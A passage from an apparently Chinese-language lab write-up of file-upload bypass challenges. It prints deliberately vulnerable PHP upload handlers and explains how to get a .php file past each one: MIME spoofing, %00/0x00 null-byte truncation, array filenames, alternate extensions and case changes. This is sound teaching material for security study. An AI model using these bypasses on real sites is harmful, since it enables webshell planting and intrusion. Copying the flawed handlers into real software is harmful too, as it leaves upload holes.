class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH.<span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>绕过方法</strong></p>
<p>主要在服务端对数据包的MIME进行检查，修改content-type:image/jpeg即可</p>
<div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">修改之前</button></li><li class="tab"><button type="button" data-href="#-2">修改之后</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gptrxtwe87j30i7049gmh.jpg"></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><p>把 Content-Type: application/octet-stream</p>
<p>改成 Content-Type: image/jpeg</p>
<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gptrxtp5g1j30jw048gmh.jpg"></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>



<h5 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h5><p>无论是%00还是0x00，最终被解析之后都表示ascll码中的0，而ascll码中的0作为特殊字符保留，代表NULL，表示空字符，当一个字符串中存在空字符的时候，在被解析的时候就会导致空字符后面的字符被丢弃</p>
<p>%00代表着url的转换，通常用于get传参的00截断</p>
<p>php版本&lt;5.3.4的时候会出现这个情况</p>
<p>且要关闭参数<code>magic_quotes_gpc</code>，设置为OFF</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = substr(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>绕过方法</strong></p>
<p>在这里发现文件上传的路径是可控的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br></pre></td></tr></table></figure>

<p>保存文件时是将get得到的路径与随机数年月日和上传文件名拼接到一起，所以上传文件路径可控，我们将get的路径最后改为<code>test.php0x00</code>那么拼接到后面的内容就会被丢弃。</p>
<div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">修改之前</button></li><li class="tab"><button type="button" data-href="#-2">修改之后</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gq5r2rekkwj31050hfdkv.jpg" alt="文件上传-00截断1.png"></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><p>在url路径后面写入<code>test.php%00</code></p>
<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gq5r4txbw9j30zq0dcjuj.jpg" alt="文件上传-00截断2.png"></p>
<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gq5rjhb6igj30do0203yn.jpg" alt="文件上传-00截断3.png"></p>
<p>上传之后直接访问<code>/upload/test.php</code>即可</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>



<h5 id="0x00截断"><a href="#0x00截断" class="headerlink" title="0x00截断"></a>0x00截断</h5><p>无论是%00还是0x00，最终被解析之后都表示ascll码中的0，而ascll码中的0作为特殊字符保留，代表NULL，表示空字符，当一个字符串中存在空字符的时候，在被解析的时候就会导致空字符后面的字符被丢弃</p>
<p>0x00通常用于post传参的00截断</p>
<p>php版本&lt;5.3.4的时候会出现这个情况</p>
<p>且要关闭参数<code>magic_quotes_gpc</code>，设置为OFF</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = substr(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传失败&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>绕过方法</strong></p>
<p>在这里发现文件上传的路径是可控的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br></pre></td></tr></table></figure>

<p>这次是使用post进行上传，在这里对二进制进行修改</p>
<div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">修改之前</button></li><li class="tab"><button type="button" data-href="#-2">修改之后</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gq5ruya6vij31140ikn1b.jpg" alt="文件上传-00截断4.png"></p>
<p>在这里把<code>../upload/</code>改为<code>../upload/test.php</code></p>
<p>十六进制如下</p>
<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gq5somd3t9j310c05gjrj.jpg" alt="文件上传-00截断7.png"></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gq5smgnjrzj311e0gbae2.jpg" alt="文件上传-00截断6.png"></p>
<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gq5smgkakhj3105055mxc.jpg" alt="文件上传-00截断5.png"></p>
<p>修改十六进制，添加一个00字节</p>
<p>然后上传</p>
<p>有时候也可以直接写成<code>../upload/test.php.jpg</code></p>
<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gq5rjhb6igj30do0203yn.jpg" alt="文件上传-00截断3.png"></p>
<p>上传之后直接访问<code>/upload/test.php</code>即可</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>



<h5 id="截断绕过"><a href="#截断绕过" class="headerlink" title="截断绕过"></a>截断绕过</h5><p>​    截断绕过都是文件名字中不允许出现某些字符</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">%<span class="number">00</span></span><br><span class="line"><span class="number">0</span>x00</span><br><span class="line">:</span><br><span class="line">;</span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="string">^</span></span><br></pre></td></tr></table></figure>



<h5 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h5><p>通过file<sub>n<sub>ame = reset(file) . ‘.’ . file[count(file) - 1];<br>可以知道最终的文件名是由数组的第一个和最后一个元素拼接而成，如果上传不是不是数组，就自己拆成数组，就提供了绕过条件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    <span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!in_array(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!is_array(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="variable">$file</span> = explode(<span class="string">&#x27;.&#x27;</span>, strtolower(<span class="variable">$file</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ext</span> = end(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$file_name</span> = reset(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[count(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>绕过方法</strong></p>
<p>上传php文件，抓包，修改以下内容</p>
<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gq8rg3w13qj30lx09v0u7.jpg" alt="文件上传-数组.png"></p>
<p>最后上传的文件为<code>test.php</code>，直接访问即可</p>
<h4 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h4><h5 id="上传特殊可解析后缀"><a href="#上传特殊可解析后缀" class="headerlink" title="上传特殊可解析后缀"></a>上传特殊可解析后缀</h5><p>服务端进行黑名单验证，当上传的文件后缀是asp,aspx,php,jsp时，文件禁止上传</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                 <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>绕过方法</strong></p>
<p>一个语言的后缀不一定是唯一的，我们上传同类后缀也可以执行脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP:php,php2,php3,php4,php5,phtml,pht</span><br><span class="line">ASP:asp,aspx,ascx,ashx,cer,asa,asmx</span><br><span class="line">JSP:jsp,jspx,jspf,jsw</span><br><span class="line">exe:exe,exee</span><br><span class="line">....</span><br></pre></td></tr></table></figure>



<h5 id="后缀大小写绕过"><a href="#后缀大小写绕过" class="headerlink" title="后缀大小写绕过"></a>后缀大小写绕过</h5><p>在语言中，后缀的大小写是不影响使用的，所以，即使后缀是PHP，Php等这样的后缀也被看作php执行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>绕过方法</strong></p>
<p>我们发现，服务器对所有类型文件的扩展都禁止上传，包括.htaccess</p>
<p>但是并没有对扩展名的大小写进行限制</p>
<p>源码中少了这一句，此代码把所有上传文件的后缀改成小写</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$file_ext = strtolower($file_ext); //转换为小写</span><br></pre></td></tr></table></figure>

<p>这里我们通过修改文件扩展名的大小写进行绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xxx.phP</span><br><span class="line">XXX.PhP</span><br><span class="line">XXX.pHP</span><br><span class="line">xxx.PHp</span><br></pre></td></tr></table></figure>



<h5 id="点绕过"><a href="#点绕过" class="headerlink" title="点绕过"></a>点绕过</h5><p>在Windows中文件后缀名末尾有点的会自动去掉点</p>
<p>例如“test.php.”,在Windows中会自动去掉末尾的点变成“test.php”</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> 